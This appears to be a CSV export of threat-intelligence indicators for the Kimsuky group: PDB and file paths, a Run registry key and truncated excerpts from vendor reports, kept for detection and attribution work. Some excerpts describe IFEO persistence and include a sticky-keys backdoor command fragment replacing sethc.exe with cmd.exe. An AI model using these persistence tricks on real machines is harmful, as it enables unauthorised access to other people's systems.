1.0.0,actor--kimsuky,artifact--sha256:d16b649405eb591fec0e2393ee5af998d2697371606be4669899e03c91a01890,observation--sha256:62e16d00d164075e346365cd48d82aedbb13533c804084651ffed00407d9c58e,file-path,D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\rdps,D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\rdps,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9356d2bab3d0634a9389c845ceebc0e55e63be26cc5f3a5dea4194c5a7f7b8c5,observation--sha256:3e7f8e2d61adfc9128be76281bd7a1607e03b94de8bd6682c77b54f61ffa15ae,file-path,D:\work\Virus\자료조사\rat_source\C-Sharp-R.A.T-Client-master\C-Sharp-R.A.T-Client-,D:\work\Virus\자료조사\rat_source\C-Sharp-R.A.T-Client-master\C-Sharp-R.A.T-Client-,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--b637a112eaeac062,kimsuky/monthreport/ATIP_2023_May_Threat-Trend-Report-on-Kimsuky-Group.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"May 2023 Threat Trend Report on Kimsuky Group 11 Indicators Of Compromise (IOC) A portion of the following IOC s quotes other analysis reports, and there are some cases that could not be verified because samples could not be obtained. Updates may occur without prior notice when new information is found. File Paths and Names The file paths and names used by the threat group are as follows. File names of some malware or tools may be the same as those of normal files. r_enc.bin demo.txt [붇임] 약력 양식.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6680a7f618f6499d48a0dbd930a99ce28aca517dc2878339ab014fd42dc4786b,observation--sha256:9ad8efe10485918184f559e4de93355381f82f1626a166f06ffb3aadb635f7c3,file-path,E:\SPY\WebBrowser\KGH_Browser-Master,E:\SPY\WebBrowser\KGH_Browser-Master,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 13}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20] . 窃取的部分信息 四、关联分析 Kimsuky 使用的 KGH 间谍组件非常有特点，该间谍组件曾被国外安全机构披露。 在以往的攻击活动中该组件曾携带 Pdb 路径“E:\SPY\WebBrowser\KGH_Browser-Master \x64\Release\KGH_Browser-Master.pdb”，这也是 KGH 名称的来由。在本次所分析的间 谍模块的新版本中，虽然攻击者删除了 Pdb 路径信息，但从反汇编代码层面看与旧版本 K GH 间谍组件存在高度一致性。 在之前的攻击活动中，KGH 间谍组件多以模块化的方式呈现，通常需要配合其他模块 进行攻击，例如在单独的模块中实现窃密功能，而开发者在新版本中拓展了 KGH 间谍组件 的功能，包括持久化、远程控制等，且使用 FTP 协议与 C2 通信，使之成为可以独立运行 的模块。 图[21] .基本一致的窃密执行流程（左为旧版，右为新版）,
1.0.0,actor--kimsuky,artifact--sha256:f0cea3d1566f23c691815106b736cff2c8fcec1baeefea231bacfbee962d3b8c,observation--sha256:7f2162202f9b4c330f71bcd0879439db5b2eca6723552e22785d9d06a1937581,file-path,G:\Multicraft\vendor\multicraft\p,G:\Multicraft\vendor\multicraft\p,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:39772c09fd8018405157b68bdc2e1f0f6a3c8dfb7eb36e98373772bb08e3cd31,observation--sha256:f4c37d754e01a7bf1eead3cdcdb22cd55b8a70d508aad548fc2be57680adc0b0,file-path,c:\Users\Administrator\Desktop\tools\svchost.exe_,c:\Users\Administrator\Desktop\tools\svchost.exe_,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9fc0f527ea49c2909ae3a9dcf5ec7ee659dd8c4cf9da53b87e081c770bfd708d,observation--sha256:d2bb651e6c2e2074dc523a22b8fecd97ad78ea305e531d9b78721eb35127a3dd,file-path,x:\mywork\prevwork\vc attack program\makemail\release\,x:\mywork\prevwork\vc attack program\makemail\release\,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 4}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 三、样本分析 3.1 第一阶段：初始访问 攻击者使用一款名为“MakeMail”的私有工具用以制作钓鱼邮件，文件信息显示开发 语言为朝鲜语，Pdb 路径：“x:\mywork\prevwork\vc attack program\makemail\release\ makemail.pdb”，其中 work 表示开发者可能处于受雇状态，prevwork 表示该工具在攻击 前阶段进行开发，编译时间 2017 年表示攻击者可能在复用之前的工具。 图[2] . MakeMail.exe 程序文件信息 此工具先点击 MakeWord 按钮，根据所设置关键字生成类似字典的 txt 文本，同时文本 内容也可自定义，然后填写对应序号，将指定 eml 文件导入，点击 MakeEmail 按钮将目标 eml 文件中的关键词替换为序号指定的关键词用以制作钓鱼邮件，再借助类似 swaks 之类 的工具进行鱼叉邮件攻击。 图[3] . MakeMail.exe 程序界面,
1.0.0,actor--kimsuky,artifact--sha256:7151face88051092588a4ee5f21fdfa80d3aa7492934eee2b105ea00b2bccc86,observation--sha256:5ad5ab3a39c7b6f1f31e3ae182344d481e0017493749fcb2ad479407b1692664,pdb-path,C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb,C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:7151face88051092588a4ee5f21fdfa80d3aa7492934eee2b105ea00b2bccc86,observation--sha256:a78bd8d941c714927637941732e7c55bdcb51be9c7589e8789ba2043536b455b,pdb-path,C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb,C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:4b60da084973dbe60712a9cc14b7184b7ef7bb0d2a155bc64937600c9878385e,observation--sha256:9322327bd24435c3ef8a15ee57d3d54b54c2548caca5704ede19713956a0da7e,pdb-path,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb,C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 33}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○추가로, 해당유형의CHM공격C2서버에서“nhgames.zip” 라는이름의ZIP파일로위장한실행파일이배포된정황을확인했습니다. ○해당파일에대한분석을진행했지만, 의심스러운악성행위는발견되지않았으며, 공격자가제작중인테스트파일로추정하고있습니다. 또한, 공격자가“DarkHorse” 라는사용자이름을사용하는사실을확인할수있었고이번보고서의OperationName 으로명명하게됐습니다. PDB C:\Users\DarkHorse\Documents\Visual Studio2015\Projects\empty\x64\Release\empty.pdb[표4-1] nhgames.zipPDB경로 [그림4-6] nhgames.zip파일 Genians SecurityCenter 32",
1.0.0,actor--kimsuky,artifact--sha256:4c81fd8af09b53a359776b4292b9f188320a0ef045a70ad29c781640e6d14f68,observation--sha256:ca26630b678468cde7cbaf99799a4952d0f7ee2b5bb011cae26721c3c3d1df54,pdb-path,D:\MyProjects\SelfTraining\Csharp\ReconApp-Final\ReconApp\obj\x64\Release\alg.pdb,D:\MyProjects\SelfTraining\Csharp\ReconApp-Final\ReconApp\obj\x64\Release\alg.pdb,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 18}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 3.4. alg.exe ○같은시기의유사한CHM공격에서“alg.exe” 라는파일명을가진RAT유형의악성코드를확보했고분석을진행했습니다. 파일명 alg.exe 파일타입 64Bit / EXE/ .NET MD5 a8c5fc1b5fd0f45c1598dc78204b72f6 PDB D:\MyProjects\SelfTraining\Csharp\ReconApp-Final\ReconApp\obj\x64\Release\alg.pdb C2 plifty[.]lat/uEH5J[표3-2] alg.exe상세정보 ○해당악성코드의일부문자열은탐지및분석을피하기위해[AES-256+BASE64]알고리즘을통해암호화되어있습니다. [그림3-13] 난독화된문자열 [그림3-14] 문자열복호화루틴 Genians SecurityCenter 17,
1.0.0,actor--kimsuky,artifact--sha256:c1d17eff86b71d0ecbeab6555cce6fc65bfc4a157b67a296c20c35491ea7b365,observation--sha256:a354aad151fc218e7cc3609759b8927f6e98ddfc28da5c8e3c37aab34fc80cca,pdb-path,D:\Work\RdpProg\RdpScan_2019\src\vs15\x64\Release\rdpscan.pdb,D:\Work\RdpProg\RdpScan_2019\src\vs15\x64\Release\rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ddbe1365680476ffb1fd3e9880bcde878b05f2fa2b969da49684feecd73878a4,observation--sha256:c6ebda5ecd1a871c77ba03103595c21e31c2c6aef589470f813126a3aff93be3,pdb-path,D:\Work\RdpProg\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,D:\Work\RdpProg\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b80831f46d4ae70518d6e7d17405b572a2e98706385a6dafc1ab60289500023d,observation--sha256:ce741d282b6034cb127094bb44ae83d172c510f25f516bbefa278851964ef402,pdb-path,D:\Work\asd\RdpScan_2019\src\vs15\x64\Release\rdpscan.pdb,D:\Work\asd\RdpScan_2019\src\vs15\x64\Release\rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:83d607e00697c962859007ffb18b19fafa9427914e36ea8105a4f787bd80a319,observation--sha256:d6d830e4b537192176da0a8bc6a4809856b90cad614c0cae21a0cf78b7284e4a,pdb-path,D:\Work\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,D:\Work\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Information related to this is described in “(4-3) C2 Management and Operations.” Since it contains information about the file, it can be used as a reference when analyzing the file, and you can check meaningful information in the PDB path. can. For example, in Table 4 below, the string vs15 commonly included in PDB information is used by the Kimsuky organization. r_sethc_x64.ex (Table 3) Comparison of strings in r_sethc_x64.exe with original source It exists within a function that does not work",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:83d607e00697c962859007ffb18b19fafa9427914e36ea8105a4f787bd80a319,observation--sha256:760f28868c6b4bec0ac52dcfab1b6efe83164eb3b89ec409c626cff55c7bca3c,pdb-path,D:\Work\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,D:\Work\rdpscan_Detect\src\vs15\x64\Release\rdpscan.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:259998d694c989a0b1f98301e285debe52aa5f4c56914851880ad858fa164de9,observation--sha256:878dc4a5129366cc88057f41b1e5064ddfade870a5c03b3058309f045a3afc52,pdb-path,F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb,F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 3}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 3VIRUS BULLETIN CONFERENCE OCTOBER 2021  Distribution URL: nexfqlymnurqydrttq.esy[.]es/utopia/downloads/seed, 185.224.138.13 - PDB path of decoded binary (seed): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb - Another binary (seed64): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb Double XOR decoding routine One of the significant features of AppleSeed is that various strings necessary for the execution of malicious codes",
1.0.0,actor--kimsuky,artifact--sha256:5efa0512bf2c34641b834538359b092c111cf7662bbc6bec7b12d41cb173bd15,observation--sha256:35581e2d2e2e6cf210a316fa5c0672eaa609a4d90853fb9a8ce7c174b5caa687,pdb-path,F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb,F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 3}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 3VIRUS BULLETIN CONFERENCE OCTOBER 2021  Distribution URL: nexfqlymnurqydrttq.esy[.]es/utopia/downloads/seed, 185.224.138.13 - PDB path of decoded binary (seed): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed.pdb - Another binary (seed64): F:\PC_Manager\Utopia_v0.1\bin\ AppleSeed64.pdb Double XOR decoding routine One of the significant features of AppleSeed is that various strings necessary for the execution of malicious codes",
1.0.0,actor--kimsuky,artifact--sha256:958e8d165c91956268f0fe96bf992f02aa9d5cea404f65fa71829e303364bd89,observation--sha256:a6f7648c0026788f701f3667c9367113ed781cadd584c30a2045f09e3a254266,pdb-path,I:\splwow64_poc\Release\CreateDC.pdb,I:\splwow64_poc\Release\CreateDC.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:958e8d165c91956268f0fe96bf992f02aa9d5cea404f65fa71829e303364bd89,observation--sha256:3b68726213a7c02398dd792177a0b6a6a6d85225552cd7e30a404c4c4f7f7245,pdb-path,I:\splwow64_poc\Release\CreateDC.pdb,I:\splwow64_poc\Release\CreateDC.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:1aa3423301fd841e45bb1033579d7aa1e363d2b3e2177726d43a04d9cb360729,observation--sha256:c977a3306eb8f1a7fbdf2c35a8f21f3eb577b7b5800cb76a299627768ec5e137,pdb-path,I:\splwow64_poc\x64\Release\DLL.pdb,I:\splwow64_poc\x64\Release\DLL.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:1aa3423301fd841e45bb1033579d7aa1e363d2b3e2177726d43a04d9cb360729,observation--sha256:7fc736cfddc096dd5a9af7d5eb822cbbc4eababc87bc79cfee7091fc87d295bb,pdb-path,I:\splwow64_poc\x64\Release\DLL.pdb,I:\splwow64_poc\x64\Release\DLL.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:fc7cc773fdd61aa5b4d38ebf0607a1039fea989c1e24e20a5b6e7e2c849d006c,observation--sha256:da1a01098364d5a0db3e2cef5c2beb2981e60099b54c39dd2eb8eca896ffce42,pdb-path,X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.pdb,X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:fc7cc773fdd61aa5b4d38ebf0607a1039fea989c1e24e20a5b6e7e2c849d006c,observation--sha256:d9d017b8a27e2443749e108a787759502c44d54de066729c4739f059d1c2926a,pdb-path,X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.pdb,X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:a56755be791f5fa84cf57f337ec3fdcdf5b82dca3400191bf10292ad74d99a65,observation--sha256:bbc5b0774ed5690acf502084115fa9accd386f91650e1b0043a97e25e624bab3,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 